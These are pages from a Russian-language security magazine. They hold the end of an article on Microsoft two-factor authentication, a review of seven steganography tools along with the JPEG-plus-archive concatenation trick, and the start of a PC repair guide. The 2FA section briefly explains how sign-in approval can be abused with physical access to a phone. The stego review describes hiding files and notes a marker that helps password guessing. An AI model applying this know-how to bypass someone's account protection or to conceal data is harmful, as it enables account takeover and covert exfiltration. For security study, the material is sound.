(а это, на минуточку, не только логин в мобильные телефоны на Windows
Phone 8.1 и Windows 10 Mobile, но и зачастую логин в Windows 10, Skype, до-
ступ к OneDrive, Office 365 и множеству подобных вещей). Видимо, поэтому
в Microsoft решили применять двухфакторную аутентификацию даже тогда,
когда пользователь не знает, что она есть. Правда, запрос на вторичную ау-
тентификацию будет выдаваться далеко не всегда, а только при необычной
с точки зрения Microsoft попытке входа в учетную запись (например, с нового
устройства в поездке), начальной настройке устройства, начальной синхрони-
зации паролей и его восстановлении из облачной резервной копии.
   Что делать, если от тебя требуют верифицировать учетную запись, но двух-
факторную аутентификацию ты не включал? Компания предусмотрела целый
ряд способов, и некоторые из них абсолютно прозрачны. Так, во время актива-
ции телефона на Windows 10 Mobile система автоматически определяет номер
телефона установленной в устройство SIM-карты. Если этот номер ты ранее
добавлял в свою учетную запись Microsoft Account, то на него будет выслано
текстовое сообщение СМС. Это сообщение получит и обработает мастер на-
стройки телефона совершенно прозрачно и незаметно.
   Если же в телефон установлена SIM-карта с незнакомым номером или
устройство настраивается вовсе без SIM-карты, то у тебя есть несколько ва-
риантов. Во-первых, система может отправить СМС с одноразовым кодом
на один из ранее добавленных номеров. Во-вторых, одноразовый код можно
получить на адрес электронной почты, также заранее добавленный и верифи-
цированный (в скобках заметим, что такой код автоматически отправляется,
если система обнаруживает необычную попытку входа в учетную запись — на-
пример, из другой страны с нового устройства). Но самое необычное в том,
что пользователь может настроить все возможные способы двухфакторной ау-
тентификации (push-уведомления, одноразовые пароли TOTP и другие), не ак-
тивируя полноценную защиту.
   Остановимся на этом моменте: пользователь автоматически (без возмож-
ности отказаться) получает гибкую защиту методом двухфакторной аутентифи-
кации для некоторых действий с учетной записью, не активируя двухфакторную
аутентификацию в явном виде. Microsoft защищает резервные копии (восста-
новление на новое устройство), пароли браузера (для того чтобы они син-
хронизировались с новым устройством, потребуется аутентификация), а так-
же попытки входа в учетную запись с новых устройств из других стран. Про эту
систему стоит знать, чтобы не оказаться в ситуации, когда ОС требует ввести
подтверждающий код, доступа к которому нет.
  А что будет, если двухфакторную аутентификацию активировать? В этом
случае защита распространяется на любые действия, связанные с Microsoft
Account. Любые попытки входа в учетную запись, доступ к электронной почте
Hotmail, Live.com и Outlook.com (в том числе по протоколу IMAP или POP3), до-
ступ к облачному хранилищу OneDrive, запуск Skype и прочие действия потре-
буют дополнительной верификации.
  При этом в Microsoft прекрасно осознают, что далеко не все приложения
поддерживают двухфакторную аутентификацию. Более того, в компании отсле-
живаются все активные приложения, которые используют сервисы Microsoft.
В тот момент, когда пользователь включает двухфакторную аутентификацию,
он видит сообщение, в котором перечислены приложения, не поддерживаю-
щие двухфакторную аутентификацию (в нашем случае ими были старая вер-
сия Outlook и почтовый клиент Hub на смартфоне с BlackBerry 10). Более того,
в этом же сообщении выводится и специальный пароль («пароль приложе-
ния») для таких приложений, а также даются инструкции, как создавать допол-
нительные пароли.
   Установив новое приложение, не поддерживающее двухфакторную аутен-
тификацию, ты автоматически получишь сообщение на адрес электронной по-
чты, в котором будут содержаться инструкции о создании пароля приложения.
   Активация и деактивация двухфакторной аутентификации происходят ис-
ключительно через браузер на странице account.live.com. Для действий с двух-
факторной аутентификацией можно использовать любое устройство. Привяз-
ки к семейству операционных систем от Microsoft нет.

Аутентификация через СМС
Ничего нового, полный аналог реализации от Apple и Google, за исключением
одной особенности. Если во время начальной настройки телефона под управ-
лением Windows 10 Mobile установлена SIM-карта с доверенным номером,
то верификация происходит прозрачно для пользователя (система автомати-
чески принимает и обрабатывает СМС, в котором, кстати, не содержится ни-
какого одноразового пароля, то есть перехват этого сообщения на другом
устройстве бесполезен).

Подтверждение через уведомление
Подтвердить  личность можно с помо-
щью специального приложения  (Identity
Verification  App), в роли которого мо-
жет  выступать  собственный  Microsoft
Authenticator.
  С  помощью  приложения  Microsoft
Authenticator  (его  необходимо  устано-
вить и настроить на устройстве, которое
ты хочешь сделать доверенным) мож-
но принимать интерактивные уведомле-
ния «да — нет». Для верификации входа
в учетную запись достаточно одобрить
уведомление. Удобно и то, что приложе-
ние Microsoft Authenticator есть для всех
основных мобильных платформ — Android,
iOS и Windows 10 Mobile, хотя почему-то
недоступно для полноценной Windows 10.
  На  устройствах  под  управлением
Android или iOS подтвердить вход можно,
только разблокировав устройство. А вот
на смартфонах под управлением Windows
10 Mobile это не так: уведомление появ-
ляется поверх экрана блокировки и под-                                                                   Microsoft Authenticator
твердить его можно, даже не разблокиро-
вав устройство.

Стандартные аутентификаторы TOTP
Microsoft поддерживает аутентификацию по стандарту TOTP. Инициализация
единственным QR-кодом, с помощью которого можно настроить любое количе-
ство приложений-аутентификаторов. Отзыв конкретного устройства невозможен.
   Использование стандартного протокола удобно, так как приложения-ау-
тентификаторы доступны практически для всех платформ. Система полностью
стандартная; с помощью приложения Google Authenticator можно успешно ве-
рифицировать учетные записи Microsoft, и наоборот.
  В то же время при использовании собственного приложения Microsoft
Authenticator (на платформах Android, iOS и Windows 10) можно инициализиро-
вать доверенное устройство уникальным секретом (можно отозвать в индиви-
дуальном порядке). Коды в этом случае генерируются восьмизначные.

Пароли приложений
Реализация паролей приложений похожа на подобные от Apple и Google. Па-
роли состоят из 16 символов латинского алфавита в нижнем регистре. Каждый
пароль может быть отозван в индивидуальном порядке.

Как взломать
Про SIM-карту, наверное, уже все понятно, останавливаться на этом спо-
собе не будем. Если есть доступ к доверенному телефону под управлением
Windows 10 Mobile, можно просто подтвердить запрос на вход, даже не раз-
блокировав экран. Если же пользователь установил приложение-аутентифи-
катор на смартфон с Android, то вытащить его данные можно точно с помощью
тех же способов, что подходят для взлома двухфакторной аутентификации
Google. А вот заблокированный iPhone — это уже серьезно: воспользовать-
ся приложением-аутентификатором или достать из него коды ты не сможешь,
не разблокировав предварительно сам телефон.

Как защититься
Методы опять же стандартные. По возможности не пользуйся небезопасными
методами доставки одноразовых кодов (СМС и доставка на доверенный адрес
электронной почты — его тоже могут взломать). Если аутентификатор установ-
лен на смартфон с Android — включи блокировку экрана и шифрование разде-
ла данных. Если же у тебя смартфон на Windows 10 Mobile, то единственное,
что ты можешь сделать, — это не пользоваться на нем приложением Microsoft
Authenticator, так как оно выводит запрос на вход прямо поверх экрана блоки-
ровки. Впрочем, альтернатив этому приложению масса даже в небогатом ма-
газине Microsoft.

ЗАКЛЮЧЕНИЕ
Как видишь, у каждой из трех компаний — разработчиков мобильных операци-
онных систем есть что предложить своим пользователям. Apple отличилась тем,
что предоставляет как самую безопасную, так и самую дырявую системы двухфак-
торной аутентификации одновременно. Google в своем репертуаре — десяток
способов верифицировать логин, работающий на любой платформе. Microsoft
выделяется тем, что двухфакторную аутентификацию включила без шума и помпы
для всех пользователей, предлагая при этом два уровня защиты.
PCZONE
ТАЙНЫЕТАЙНЫЕТАЙНЫЕ
ЗНАКИЗНАКИЗНАКИ




                                                                              84ckf1r3
                                                                                84ckf1r3@gmail.com





ИЗУЧАЕМ УТИЛИТЫ ДЛЯ СТЕГАНОГРАФИИ
И ПРЯЧЕМ ОДНИ ФАЙЛЫ ВНУТРИ ДРУГИХ


Шифрование помогает сохранять данные в секрете, но од-
новременно привлекает лишнее внимание. Если файл так
просто не открыть, значит, в нем наверняка есть что-то
ценное. Поэтому бывает важно скрыть само наличие се-
кретной информации. Проще всего это сделать, растворив
конфиденциальные данные внутри какого-нибудь безо-
бидного файла. Решается такая задача с помощью стега-
нографических утилит, которые мы и протестируем.
  ~~~~~~~~~~

ОТ ФАРАОНОВ ДО НАШИХ ДНЕЙ
Если считать, что история развивается по спирали, то
современная жизнь во многом похожа на ту, что была в
Древнем Египте. Люди снова поклоняются кошкам и хра-
нят их изображения повсюду. Параллельно возрождается
культ тайного знания — одни прячут информацию, дру-
гие ищут способы получить ее. Так что идеальный способ     WARNING
скрыть секретные данные — это смешать их с тривиаль-
                                                                             Статья написана в ис-ным контентом вроде фотографий кошек.                                                                            следовательских целях.
  По одной из версий, криптография зародилась как раз    Вся информация в ней
в Древнем Египте. Ее дочка — стеганография, или «тайно-   носит ознакомительный
                                                                                  характер. Она адре-пись», появилась уже ближе к расцвету Римской империи.
                                                                           сована специалистам
Отдельные приемы тайного письма практиковались еще                                                                       по безопасности и тем,
до нашей эры, но в самостоятельную прикладную дисци-      кто хочет ими стать.
плину стеганография оформилась лишь к XVI веку.
   Современная стеганография — цифровая и компьютерная. Последнюю мож-
но разделить на три больших направления. Первое — это собственно тайно-
пись, или методы сокрытия одних файлов (которые принято называть сообще-
нием) внутри других («контейнера»). После заполнения сообщением контейнер
внешне меняется незаметно и полностью сохраняет свою функциональность.
   Второе направление изучает методы добавления к сообщению скрытых или
стеганографических меток (stegomarks). Это незаметные без специальной об-
работки метки, идентичные для всех файлов одного человека или устройства.
Например, такие стегометки записываются в цифровые фотографии для того,
чтобы можно было доказать их авторство. Крэкеры иногда оставляют стегомет-
ки в лицензионных ключах. Они зашиты на уровне алгоритма генерации, а пото-
му сохраняются при попытке изменить интерфейс кейгена и выдать его за свой.
   Третье направление — внедрение в сообщение цифровых отпечатков
(digital fingerprints). В отличие от стегометок, эти скрытые знаки уникальны
для каждого сообщения. Они служат в основном для защиты интересов право-
обладателей, позволяя отследить распространение контента. К примеру, мно-
гие интернет-магазины внедряют цифровые отпечатки в продаваемые книги
и музыкальные композиции. В них кодируется информация о дате продажи
и аккаунте купившего (имя, IP-адрес и прочее). Если купленные файлы позже
появятся среди торрентов или на файлообменниках, то правообладатели смо-
гут установить распространителя нелегального контента. Для этого будет до-
статочно считать из контрафактного файла вкрапленный цифровой отпечаток.
   Использует ли твой любимый онлайновый сервис стегометки? Это легко
проверить. Достаточно купить два экземпляра одного и того же произведе-
ния с разных аккаунтов и сделать побайтное сравнение файлов. Разница меж-
ду ними и покажет скрытые метки. Если же файлы скачались идентичные (и их
хеши полностью совпадают), то стегометок внутри нет.
  О каждом из этих направлений написано множество книг и статей, но до сих
пор нет единой терминологии. Одни авторы дробят перечисленные ветви
на десятки более мелких, а другие не видят принципиальной разницы и между
крупными. Для кого-то есть тонкая грань между скрытым хранением и скрытой
передачей данных, а для других это лишь частности.
  Не будем вдаваться в полемику, гораздо интереснее попробовать стегано-
графию в деле. Для начала рассмотрим поближе ее основное применение —
сокрытие данных. Из полусотни утилит для маскировки одних файлов внутри
других мы отобрали всего семь. В обзор вошли только те, которые гарантиро-
ванно работают в Windows 10.
   Для теста мы возьмем картинку с обоями для рабочего стола. За этой рас-
тительностью можно уместить много интересного.





ANUBIS
sourceforge.net/projects/anubisstegano/files/latest/download
Анубис — супергерой древних египтян. Человек-шакал, в честь которого спу-
стя шесть тысяч лет назвали бесплатную программу. Ее первая и, к сожалению,
последняя версия была написана в 2014 году на Java. Поэтому утилита полу-
чилась кросс-платформенной, но требующей установки JRE, а также (в случае
с Windows 10) виртуальной машины DOS — NTVDM.





                                                     Принести Анубису Джаву!

Основное окно программы выглядит максимально аскетично. Нажимаем
Encrypt и в открывающейся вкладке указываем необходимые действия: какой
файл поместить внутрь какого и где сохранить результат. Гарантированно ра-
ботает только сокрытие текстовых файлов внутри картинок формата BMP. Не-
сколько таких уже есть в Windows 10 — это иконки пользователей. Было бы
занятно спрятать в user.bmp список паролей или еще какую-нибудь конфиден-
циальную инфу. Давно подмечено, что лучшие тайники стоят на видном месте.





                                                         Прячем TXT в BMP

Дополнительно можно защитить полученный файл пин-кодом — тогда он по-
требуется для обратного преобразования. Утилита некорректно обрабатывает
строку с указанием места результирующего файла. Он может быть сохранен
на уровень выше заданного или вообще в исходном каталоге.





                                    Сравнение пустого и наполненного контейнера

Как видно из побайтного сравнения исходного файла BMP с содержащим
скрытый текст, программа работает очень примитивно. Она просто дописыва-
ет данные в конец файла. Данные зашифрованы, но снабжены характерными
указателями: limiter1, limiter2, inserted length begins. Простым поис-
ком файлов, содержащих такие строки, легко найти все стегоконтейнеры. Та-
кую утилиту можно использовать в качестве иллюстрации простейшего метода
стеганографии, но для серьезных задач она совершенно не подходит.

DEEGGER EMBEDDER
www.softpedia.com/get/Security/Encrypting/DeEgger-Embedder.shtml#download
DeEgger Embedder — еще одна маленькая программа для стеганографии.
В ней реализован уже больший набор функций, но его использование требует
установки .NET Framework 3.5. Помимо редко используемых сегодня картинок
BMP, программа поддерживает в качестве контейнеров PNG, JPG, видеофай-
лы AVI и музыкальные MP3. Утилита ведет подробный лог своих действий, ко-
торый отображается прямо в главном окне.





                                                  Делаем пасхальные яйца!

Кнопка запуска алгоритма называется Combine, а не Encrypt, что более точно
отражает процесс внедрения файлов. Извлекаются скрываемые файлы (сте-
госообщения) из мультимедийных контейнеров нажатием единственной кноп-
ки Extract. Никакой защиты пин-кодом здесь нет.





                                                        Комбайн и экстракт

Зато программа может обрабатывать несколько файлов сразу. Можно поме-
стить несколько сообщений в один контейнер или одно в разные контейнеры.





                                 Записываем несколько файлов в один контейнер

После обработки в DeEgger утилиты для сравнения изображений считают
идентичными исходный и конечный файлы BMP. Реально же это пустой и за-
полненный контейнер в терминологии стеганографии.





                                                   Мнимая идентичность

Сделаем побайтное сравнение. Знакомая картина? Так же как и Anubis, утили-
та DeEgger Embedder дописала стегосообщение в конец файла-контейнера.





                                                   Те же пасхальные яйца, вид в коде

На первый взгляд, здесь нет явных указателей, по которым можно сделать
поиск файлов, содержащих определенную строку. Однако приглядимся вни-
мательнее. Для этого сделаем еще один контейнер с другим сообщением
и сравним уже два заполненных контейнера между собой.





                                        Находим указатель внедренного файла

Вот одинаковый участок в шестнадцатеричном виде: 24 23 26 29 2A 40 26
28 23 5E 2A 00 D1 8B 87 8B FF.
   Как видишь, несмотря на поддержку большего числа форматов, DeEgger
недалеко ушел от Anubis. Скрываемые файлы так же записываются в конец
файла-контейнера и имеют характерный вид, по которому их легко обнару-
жить.

DEEPSOUND
jpinsoft.net/DeepSound/Overview.aspx
Последняя версия этой программы вышла в ноябре 2015 года. В отличие
от предыдущих утилит в этом обзоре, она прячет данные внутри звуковых фай-
лов. В качестве контейнеров DeepSound может использовать WAV (только
несжатый, PCM), а также MP3, CDA, WMA, APE и FLAC. DeepSound умеет вне-
дрять файлы любого типа и автоматически рассчитывает доступное для них
место в зависимости от размера контейнера и настроек качества аудио.
  При использовании MP3 доступное место для стегосообщения показыва-
ется больше самого контейнера, но это иллюзия. Независимо от исходного
формата файла новый контейнер создается только в одном из несжатых фор-
матов: WAV, APE или FLAC. Поэтому размер первоначального контейнера зна-
чения не имеет. В итоге сообщение будет занимать какой-то процент от объе-
ма нового (несжатого) аудиофайла.





                                          Большой объем для любых файлов

Программа может просто поместить любой файл внутри музыкального, или
предварительно зашифровать его по алгоритму AES с длиной ключа 256
бит. Опытным путем было установлено, что предельная длина пароля — все-
го 32 символа. Мои обычные пароли были длиннее и приводили к ошибке (an
unhandled exception).





                                                       Шифрование AES

В один контейнер можно поместить любое количество файлов, пока не запол-
нится счетчик свободного места. Его количество зависит от степени качества
(то есть вносимых в аудиофайл искажений). Всего доступны три настройки: вы-
сокое, обычное и низкое качество. Каждая из них увеличивает полезный объ-
ем контейнера вдвое. Однако рекомендую не жадничать и всегда использовать
максимальное качество — так сложнее будет обнаружить скрытый файл.
   Извлекается стегосообщение после выбора соответствующего контейне-
ра вручную. Если использовалось шифрование, то без ввода пароля програм-
ма не покажет даже название скрытого файла. Кириллические символы в на-
званиях файлов не поддерживаются. При извлечении они заменяются на XXXX,
однако на содержимое файла это никак не влияет.
  DeepSound умеет конвертировать MP3 и CDA, поэтому мы легко можем
преобразовать исходный файл из MP3 в WAV и сравнить два контейнера: пу-
стой и заполненный.





                                                PDF размазан внутри WAV

Здесь нас ждет приятный сюрприз: размеры файлов идентичны, а их содер-
жимое различается сразу после заголовка. Байты отличаются почти вез-
де через один, причем на малые значения. Скорее всего, перед нами реа-
лизация алгоритма LSB (Least Significant Bit — наименьший значащий бит).
Суть его в том, что скрываемый файл кодируется как изменения младших
битов в отдельных байтах контейнера. Это приводит к небольшим искаже-
ниям (изменению оттенка пикселя в BMP и частоты звука в WAV), которые
человек обычно не воспринимает. Чем больше контейнер по отношению
к скрываемому файлу, тем меньше вероятность обнаружить последний. Та-
кой алгоритм не оставляет явных указателей на наличие внедренного файла.
Предположить его наличие может только статистический анализ шумов (аку-
стических, яркостных, цветовых и прочих), но это уже совсем другой уровень
стегоанализа.
  DeepSound уже вполне годится для сокрытия важной информации (кроме
гостайны, разумеется). Можно применять и встроенное шифрование, но, на-
сколько качественно оно реализовано, никто не знает, потому что открытого
аудита у программы не было. Поэтому надежнее будет предварительно поме-
стить секретные файлы в какой-нибудь надежный криптоконтейнер (например,
TrueCrypt или VeraCrypt), а затем уже прятать его внутри аудиофайла. Если
ты будешь использовать в качестве контейнеров уникальные аудиофайлы (на-
пример, собственные записи), то побайтно сравнить их будет не с чем и твою
«матрешку» вряд ли кто-нибудь сможет найти. Просто запиши в тот же каталог
несколько гигабайтов теплого несжатого звука для лучшей маскировки.

HALLUCINATE
sourceforge.net/projects/hallucinate
Последняя версия программы Hallucinate (v. 1.2) вышла в ноябре 2015 года. Эта
компактная (всего 34 Кбайт) утилита написана на Java и не требует установки.
В качестве контейнера она поддерживает форматы BMP и PNG, что делает ее
гораздо удобнее Anubis. Картинки PNG используются сегодня куда чаще, чем
BMP. Их полно даже во временных каталогах браузера, поэтому лежать одино-
ким и очень заметным файлом на диске такой контейнер точно не будет.





                                                   Галлюцинации со смыслом

Интерфейс у Hallucinate прост и функционален. Требуется выбрать контей-
нер, указать скрываемый в нем файл и желаемую степень качества итоговой
картинки. Доступны восемь вариантов. Чем сильнее огрубляется исходное
изображение, тем больше в нем можно спрятать, но тем заметнее становят-
ся артефакты. Выберем в настройках лучшее качество и проиллюстрируем эту
разницу, повторив операцию с файлом BMP.





                                              Видишь отличия? А они есть!

Визуально картинки слева и справа не отличаются. Однако программа Beyond
Compare показывает разницу между ними в кадре по центру. Текстовый файл
закодирован как изменения яркости отдельных пикселей, равномерно рас-
пределенных по всему кадру. Только в самых темных и самых светлых участках
они кучкуются плотно.
  При побайтном сравнении файлов эта же разница в шестнадцатеричном
формате выглядит знакомо: тот же алгоритм LSB, что и у DeepSound. Графи-
ческий файл или звуковой — в данном случае значения не имеет. В оба фор-
мата вносятся минимальные искажения, неразличимые без специальных ме-
тодов сравнения. Обнаружить их без исходного файла (имея на руках только
контейнер) довольно сложно. Никаких явных указателей на внедрение стего-
сообщения он не содержит. Выдает скрытый файл только частотный анализ,
но хорошо работает этот метод только для обнаружения крупных «матрешек».
Мелкий файл в большой картинке остается практически незаметным.
   Извлекается скрытый файл буквально в два клика. Достаточно выбрать кон-
тейнер (HAL-file в терминологии автора программы), нажать Decode и указать
место для сохранения файла.





                                                        Раздеваем матрешку



                           Продолжение статьи
PCZONE



     Начало статьи
ТАЙНЫЕТАЙНЫЕТАЙНЫЕ
ЗНАКИЗНАКИЗНАКИ
ИЗУЧАЕМ УТИЛИТЫ ДЛЯ СТЕГАНОГРАФИИ
И ПРЯЧЕМ ОДНИ ФАЙЛЫ ВНУТРИ ДРУГИХ

JHIDE
sourceforge.net/projects/jhideapp
JHide (не путать с джихадом) — еще одна подобная программа на Java. Ком-
пактной ее не назовешь, она занимает почти три мегабайта. Однако в отличие
от Hallucinate, помимо BMP и PNG, она поддерживает TIFF, а также позволяет
использовать защиту паролем.





                                                           Интерфейс jHide

Сравнение утилитой Beyond Compare показывает едва различимые отличия.
В первую секунду их не видно вообще. Надо прибавить яркости и присмо-
треться, чтобы разглядеть на черном фоне равномерно рассеянные темно-си-
ние точки.





                                                             Результат работы jHide

Сравнение в hex-кодах показывает все тот же алгоритм LSB, однако его реа-
лизация здесь более удачная. Измененные пиксели не группируются крупны-
ми блоками от начала файла, а равномерно рассеяны по всему контейнеру.
Так гораздо сложнее обнаружить скрытое сообщение в картинке. При ма-
лом размере стегосообщения это практически невозможно сделать, не имея
для сравнения оригинал (пустой контейнер).





                                                         Правильный LSB

Программа сама пытается максимально сжать скрываемый файл перед его
помещением в контейнер. Поэтому извлекается он всегда в формате ZIP,
а спрятанный файл находится уже внутри этого архива. Парольную защиту не-
обходимо деактивировать перед распаковкой вручную — jHide сама не пока-
жет, надо ли его вводить. Это тоже плюс, поскольку исключает возможность
использования утилиты для проверки изображений на наличие в них скрытых
файлов.





                                                  Распаковка контейнера в jHide

Утилита иногда игнорирует вводимое имя файла и извлекает его с шаблонным
именем stego_%name%.bmp, однако эту недоработку можно и простить. Со-
держимое файла считывается ей без искажений.

OPENPUFF
download.cnet.com/windows/openpuff-team/3260-20_4-10146585-1.html
Самая сложная утилита в этом обзоре — OpenPuff. Ее последняя версия (4.00)
поддерживает не только сокрытие одних файлов внутри других, но и работу
со стегометками произвольного формата. Ей даже можно выделить несколько
процессорных ядер, если предстоит большой объем работы.





                                                       Основное окно OpenPuff

В отличие от других утилит, поддерживающих парольную защиту скрываемо-
го сообщения, OpenPuff умеет использовать для шифрования криптографиче-
ски стойкий генератор псевдослучайных чисел (CSPRNG — Cryptographically
secure pseudorandom number generator). Если простого пароля недостаточно,
то поставь флажки напротив полей B и C, а затем введи в них три разных паро-
ля длиной от 8 до 32 символов. На их основе CSPRNG сгенерирует уникаль-
ный ключ, которым и будет зашифровано сообщение.





                                                       Использование CSPRNG

Мелкие файлы можно хранить в картинках и аудиозаписях, а крупные (напри-
мер, криптоконтейнеры) удобнее прятать в видеозаписях — OpenPuff поддер-
живает MP4, MPG, VOB и множество других форматов. Максимальный размер
скрываемого файла — 256 Мбайт.





                                                         Результат работы OpenPuff

Применение CSPRNG на малых файлах сильно увеличивает итоговый размер
стегосообщения. Поэтому разница между пустым и заполненным контейне-
ром становится слишком очевидной. Мы снова видим, что измененные пиксе-
ли в основном распределяются равномерно, однако на самых светлых и самых
темных участках они образуют крупные блоки. Если бы таких блоков не было,
результат был бы больше похож на артефакты, получаемые при сжатии при по-
мощи JPEG.
   Побайтное сравнение тоже дает очень характерную картину. Несмо-
тря на малый размер скрываемого файла, в контейнере изменены значения
у большинства пикселей. Если jHide хватило 330 байт для записи стегосооб-
щения, то OpenPuff использовал для этой же задачи более 170 Кбайт.





                                    Изменения затронули большинство пикселей

С одной стороны, это плюс: нет прямой корреляции между размером сообще-
ния и числом измененных пикселей. Анализ такого контейнера существенно
усложняется. С другой стороны, на создание контейнера приходится затратить
дополнительные усилия, что может оттолкнуть неискушенного пользователя.
   Другой режим работы программы — запись и чтение стегометок. Это скры-
тые строки длиной до 32 символов, которые можно использовать для защиты
авторского права. Например, спрятать копирайт в фотографии, музыкальном
файле или документе.
   Работает эта функция исключительно просто. Пишешь произвольную сте-
гометку в верхней части окна и указываешь ниже файлы, в которые ее надо до-
бавить. Исходные файлы останутся нетронутыми, а их копии с меткой сохра-
нятся в указанном тобой каталоге.





                                               Работа со стегометками в OpenPuff

При возникновении любых правовых споров просто запускаешь OpenPuff и по-
казываешь изумленному оппоненту ранее внедренную метку.





                          Даже лягушка может сказать, кто ее сфотографировал

Сложности возникают в том случае, если файл подвергался модификации.
Даже простое конвертирование в другой формат стирает стегометку. Не уда-
ется ее считать и в том случае, если файл был снова приведен к исходному
формату. Стойкие стегометки существуют, но внедрять их умеют только от-
дельные программы. Как правило, они привязаны к какому-то конкретному
оборудованию (например, модели камеры).





                                   Стегометка испарилась после конвертации файла


OPENSTEGO
www.openstego.com
Последняя версия OpenStego (0.61) вышла в 2014 году. Программа работает
в Windows и Linux. Она поддерживает BMP, PNG, JPG, GIF и WBMP. Заполнен-
ный контейнер всегда сохраняется в формате PNG.
   OpenStego занимает всего 203 Кбайт, но после знакомства с Hallucinate
это уже не впечатляет. Формально утилита требует установки, хотя может быть
легко превращена в портейбл-версию. OpenStego привлекает тем, что под-
держивает парольную защиту и тоже умеет внедрять стегометки (правда, эта
функция пока что имеет статус «бета»).





                                                       Интерфейс OpenStego

После добавления к выбранному изображению небольшого текстового файла
визуально отличия между пустым и заполненным контейнером практически от-
сутствуют.





                                                     Найди десять отличий

Однако размер файла увеличился на один мегабайт, а из-за конвертации в PNG
с другой степенью сжатия это стал просто другой файл. При побайтном сравне-
нии с оригиналом отличия будут во всех значениях сразу после заголовка.





                                                          OpenStego: hex-сравнение

Интересно, что программа никак не проверяет правильность вводимого па-
роля при извлечении стегосообщения из контейнера. Она честно пытается
собрать извлекаемый файл в любом случае и всегда сообщает, что опера-
ция прошла успешно. В действительности же спрятанный файл будет извле-
чен только после ввода правильного пароля. В остальных случаях произойдет
ошибка и файл не запишется. Такой подход слегка затрудняет использова-
ние классических методов перебора паролей, в которых следующая комби-
нация подставляется после неудачной проверки предыдущей. Однако маркер
успешного извлечения все же есть. Достаточно указать в качестве каталога
пустой и перебирать пароли до тех пор, пока в нем не появится файл. Было бы
лучше записывать любой результат извлечения как файл — это бы повысило
уровень защиты.
   Внедрение стегометок в этой программе происходит не как в других. Сна-
чала генерируется сигнатура, которая сохраняется в отдельный файл с расши-
рением SIG. Какую-то осмысленную информацию в ней записать нельзя — это
просто уникальный битовый набор, вроде приватного ключа.





                                                     Создаем «водяной знак»

После внедрения стегометки создается новый и визуально идентичный файл
изображения, в котором она «растворяется». Процесс верификации сводится
к проверке наличия указанной сигнатуры внутри файла. Если она сохранилась
полностью, то совпадение будет стопроцентным. Если же файл подвергался
модификации, то стегометка может быть частично утрачена. Метод задумы-
вался как попытка внедрения стойких водяных знаков, однако в текущей ре-
ализации он практически бесполезен. Программа показывает нулевой про-
цент соответствия уже после небольшой обрезки картинки и пересохранения
в PNG с большим сжатием.





                          Водяные знаки испаряются после небольшой обработки

RARJPEG
Скрывать одни файлы внутри других можно и безо всяких стеганографиче-
ских утилит. Конечно, это будет не аккуратное «растворение» по алгоритму
LSB, а простое слияние, однако у этого известного в узких кругах метода
есть и свои преимущества. Во-первых, он доступен без дополнительных ин-
струментов. Во-вторых, позволяет легко передать любой файл, загрузив его
как графический на какой-нибудь сайт (например, хостинг или имиджборд).
  Смысл метода в том, что графические файлы (в частности, JPEG) начина-
ют интерпретироваться сразу с заголовка, в то время как архивы считываются
только с метки начала архива. Сама метка может располагаться внутри файла
где угодно, так как, помимо обычных архивов, есть многотомные и самораспа-
ковывающиеся.
  В качестве эксперимента упакуем все программы из сегодняшнего обзора
в архив ZIP и добавим этот архив к файлу Wallpaper.jpg, создав новую картинку:
Wallpaper-x.jpg. Просто запустим консоль Windows и напишем:

type Wallpaper.jpg Steg.zip > wallpaper-x.jpg





                                                     Дописываем ZIP к JPG

На выходе получится объединенный файл wallpaper-x.jpg. Его можно про-
смотреть как картинку или же открыть любым архиватором, который поддер-
живает формат ZIP. Если изменить расширение файла на ZIP, то он откроется
файловым менеджером как каталог. Можно даже обойтись без переименова-
ния, а сразу использовать архивный плагин через команду быстрой распаков-
ки (например, {ALT}+{F9} в Total Commander). Все файлы из такой «картинки»
будут извлечены без проблем.
  Описанный трюк известен давно и работает также с некоторыми другими
форматами файлов (как графических, так и архивов), однако наибольшую по-
пулярность получило сочетание RAR + JPEG.





                   Начало архива ZIP внутри картинки и имя первого архивного файла

ВЫВОДЫ
Итак, мы рассмотрели семь утилит, одинаковых по своему назначению. Если
одни можно смело рекомендовать, то другие я привел, чтобы проиллюстриро-
вать типичные ошибки.
   Настоящие стеганографические утилиты не меняют
размер файла-контейнера. Они «растворяют» скрыва-
емое сообщение по алгоритму LSB или более продви-
нутому, стремясь сделать распределение измененных
байтов неотличимым от наложения случайных шумов.
Продвинутые утилиты умеют использовать шифрование,
но добавить его можно и самому — например, исполь-     WWW
зуя VeraCrypt или тот же RAR.                                                                         Руководство по стегано-
   Обнаружилось немало программ, которые вроде бы                                                                    графии от Гэри Кесслера
обещают защиту, но на деле имеют очень косвенное
отношение к стеганографии. Они просто дописывают    Онлайновая стеганогра-
                                                                         фическая утилита
скрываемый файл в конец исходного, используют узна-
ваемые указатели и слабое шифрование.                          Стеганография
   Стеганографию эффективнее всего использовать          и малварь
не вместо криптографии, а вместе с ней. Такое сочета-
ние позволяет скрыть как саму информацию, так и факт
ее хранения или передачи.
PCZONE
ПРИКЛАДНАЯ
НЕКРОМАНТИЯ

               КАК ОЖИВИТЬ,
             ПОЧИСТИТЬ
            И НАСТРОИТЬ
             СТАРЫЙ
            КОМПЬЮТЕР





                                         Алексей «Zemond»
                                             Панкратов
                                             3em0nd@gmail.com

Компьютер шумит, тормозит и отказывается делать самые
простые вещи. Частенько вылезает BSOD, а скорость ра-
боты оставляет желать лучшего. Знакомо? Даже если с
твоей машиной такого больше не происходит, тебя навер-
няка зовут на помощь друзья и родственники. Давай раз-
берем типовые шаги, которые помогут справиться с непо-
ладками и ускорить работу даже старенького ПК.

Многие считают, что лекарство от всех болезней — это переустановка
Windows. Сорок минут втыкания в прогресс-бары — и готово! Новая система,
без глюков и проблем. Безусловно, это привлекательный способ: всегда при-
ятнее получить стабильную чистую систему, чем вычищать горы битых файлов
и библиотек. Но такое могут себе позволить не все: одно дело — свой ком-
пьютер, где ты можешь сносить систему сколько душе угодно, другое дело —
чужой ПК. На нем уже может стоять важный софт, драйверы, которые потом
придется искать, сохраненные и забытые пароли или — на корпоративной ма-
шине — разные политики и сетевые настройки.
  В общем, когда имеешь дело с каким-нибудь компьютером из бухгалтерии,
где в реестре могут быть сохранены важные ключи, существующие в един-
ственном экземпляре, лучше не начинать со сноса всего и практиковать более
мягкий и созидательный подход.

ПОСТАНОВКА ЗАДАЧИ
Чтобы не описывать ремонт воображаемого компьютера, приведу пример ре-
альной задачи. Имеется компьютер с процессором на сокете LGA775, 2 Гбайт
ОЗУ, винчестером на 500 Гбайт и интегрированной видеокартой. Жалобы на
него следующие: долго загружается, тормозит при работе с офисными прило-
жениями, медленный интернет, самопроизвольно выключается как минимум
раз в день и все время шумит вентиляторами.

